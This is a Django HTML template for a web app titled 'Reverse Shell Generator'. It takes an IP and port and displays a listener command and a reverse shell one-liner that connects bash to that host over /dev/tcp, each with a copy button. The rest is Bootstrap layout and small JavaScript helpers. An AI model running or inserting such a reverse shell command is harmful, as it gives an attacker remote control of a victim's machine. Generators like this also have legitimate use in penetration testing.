{% load static %}
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.5">
    <title>Reverse Shell- Generator</title>

    <link rel="canonical" href="https://getbootstrap.com/docs/4.3/examples/starter-template/">

    <!-- Bootstrap core CSS -->
<link href="/docs/4.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 <script src="{% static 'global.js' %}"></script>


<!-- cdn -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">



<!-- jquery cdn -->
<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>



    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
      .box .div-box{
        background: green;
        width: 30px;
        height: 25px;
      }
      #listener{
        font-size: 1rem;
        white-space: pre-wrap;
        text-align: left;
        font-weight: bold;
       
      }


      #demo{
        white-space: pre-wrap;
        max-height: 20rem;
        font-size: 1rem;
        margin-bottom: 8px;
        line-height: 1.5;
      }
      .box-shell{
        padding:22px 22px 10px 22px;  
        box-shadow: 0 -1px 10px rgba(0,0,0,.27), 0 6px 6px rgba(0,0,0,.36);
        font-weight: bold;
      }

      
    </style>
    <!-- Custom styles for this template -->
    <link href="starter-template.css" rel="stylesheet">
  </head>
  <body>
    


 <div class="jombotron container py-4">  
    <p class="h2"><strong>Reverse Shell- Generator</strong></p>
 <br>  
    <div class="row align-items-md-stretch">
        <form method="POST" id=form class="col-md-6">
            {% csrf_token %}
            <label for="exampleInputEmail1" class="fs-4 fw-bold mt-4">IP | PORT</label> 
            <div class="form-group row col-md-10 mt-3">
                <div class="col ">  
                    {{ form.ipaddress }} 
                    <small id="emailHelp" class="errorlist form-text text-muted">{{ form.ipaddress.errors }}</small>                
                </div>
                <div class="col col-md-5">  
                    {{ form.port }}
                    <small id="emailHelp" class="errorlist form-text text-muted">{{ form.port.errors }}</small>

                </div>
                 
            </div>
            <div class="mt-3">
              <button type="submit" class="btn btn-primary mx-auto">submit</button>
            </div>
        </form>
       

        {% for ip in all_ip %}
              <div class="d-flex col-md-6" style="height: 350px;">
                 <br> <div class="vr "></div>
                
                        <div class="div1 ms-3">
                            <label for="exampleInputEmail1" class="fs-4 fw-bold m-4" >LISTENER</label> 
                                <div class="d-flex flex-nowrap  ms-4 mt-0 ">

                                    <div class="card" style="width:30rem; margin-top: 10px;">
                                        <div class="card-header box-shell">
                                            <pre id="listener" class=" text-left">
                                            </pre>
                                            <button class="btn btn-outline-primary" style="margin-top: -11px; margin-right: -10px; float: right; font-size: 8px;" onclick="myFunction()">
                                                copy
                                            </button>  
                                        </div>
                                    </div>

                                </div>
                                <div class="shellType container mt-5">
                                    <div class="row ">
                                      <p class="col-3 ms-3 m-0">Shell Type: </p>    
                                        <select class="col form-select form-select-sm me-5" id="money"  onchange="createText();">                                      
                                            {% for u,i in listner.items %}
                                                <option value="{{ i.type }}">{{ i.name }}</option>
                                            {% endfor %}
                                      </select>
                                    </div>  

                                </div>
                        </div>         
              </div>  
              <br>              
                <hr>
                <br>
                    <h3 >Connect to:</h3>

                      <div class="div1 container d-flex align-items-start">
                        <div class="row" style="height: 0;">
                            
                        
                            <div class="d-flex flex-nowrap">
                                  <div class="card" style="width:50.5rem;">
                                       <div class="card-header box-shell">
                                            <pre id="demo" class="text-left">bash -i >& /dev/tcp/{{ ip.ipaddress }}/{{ ip.port }} 0>&1</pre>
                                            <button class="btn btn-outline-primary" style="margin-right: -12px; float: right; font-size: 8px;" onclick="myFunction1()">
                                                copy
                                            </button>
                                       </div>
                                  </div>
                            </div>
                        </div>
                         {% endfor %}
                    
                         <div class="ms-4 me-4" ></div>                                               
                        <div class="row " style="margin-top: -30px;">
                                    <label style="font-size: 25px; margin-bottom: 11px;">Reverse: </label>                                
                                <div class="">
                                      <div class=" list-group overflow-auto" style="width: max-content; max-height:452px;">
                                        {% for k,v in key.items %}
                                              
                                              <button onclick="{{ v.id }}()" style="width: 210px;" class="btn btn-outline-primary border border-primary  border-bottom-0 list-group-item list-group-item-action">{{ v.name }}</button>
                                              
                                        {% endfor %}
                                      </div>
                                </div>
                        </div>
                        <div class="ms-3 me-4" ></div>
                        <div class="row" style="margin-top:-30px;">
                            <div class="col-12">
                                <label style="font-size: 25px; margin-bottom: 11px;">shell: </label>
                                <form id="formTag" method="GET">
                                   
                                    <select style="width: 150px; height: 250px; font-size: 17px;" onchange="this.form.submit()" class="form-select " size="6" multiple name="shelltype" id="shelltype">
                                        {% for n in shelltype %}
                                            <option>{{ n.name }}</option>
                                        {% endfor %}   
                                    </select>
                                </form>     
                            </div>
                            
                        </div>
                      </div>
                  
    </div>


  </div>  
  
  <a href="https://www.linkedin.com/in/tejas-pachpile-2a44b417a/" target="_blank">
     <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="50" height="50" viewBox="0 0 30 30" style="color: #151513;position: fixed;left: 0;bottom: 1;">
        <path 
            d="M9,25H4V10h5V25z M6.501,8C5.118,8,4,6.879,4,5.499S5.12,3,6.501,3C7.879,3,9,4.121,9,5.499C9,6.879,7.879,8,6.501,8z  M27,25h-4.807v-7.3c0-1.741-0.033-3.98-2.499-3.98c-2.503,0-2.888,1.896-2.888,3.854V25H12V9.989h4.614v2.051h0.065  c0.642-1.18,2.211-2.424,4.551-2.424c4.87,0,5.77,3.109,5.77,7.151C27,16.767,27,25,27,25z">
        </path>

    </svg>
  </a>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>

<script type="text/javascript">




// LISTENER 
function createText() 
{
     var selectValue = document.getElementById("money").value;
     document.getElementById("listener").innerText = selectValue
}

createText();

// SHELL BUTTON
{% for a,b in key.items %}

 function {{ b.id }}(){
           var demo = '{{ b.command|default_if_none:"nocolor" }} '
           document.getElementById("demo").innerHTML = demo;
  };
{% endfor %}


  function myFunction() {
    var copyText = document.getElementById("listener").innerText;
    navigator.clipboard.writeText(copyText).then(() => {
        var copy_to_clipboard = document.getElementById("copy_to_clipboard");
            alert('Copied to clipboroard');   
    });
  };
  function myFunction1() {
    var copyText = document.getElementById("demo").innerText;
    navigator.clipboard.writeText(copyText).then(() => {
        var copy_to_clipboard = document.getElementById("copy_to_clipboard");
            alert('Copied to clipboroard');   
    });
  };
</script>

</body>

</html>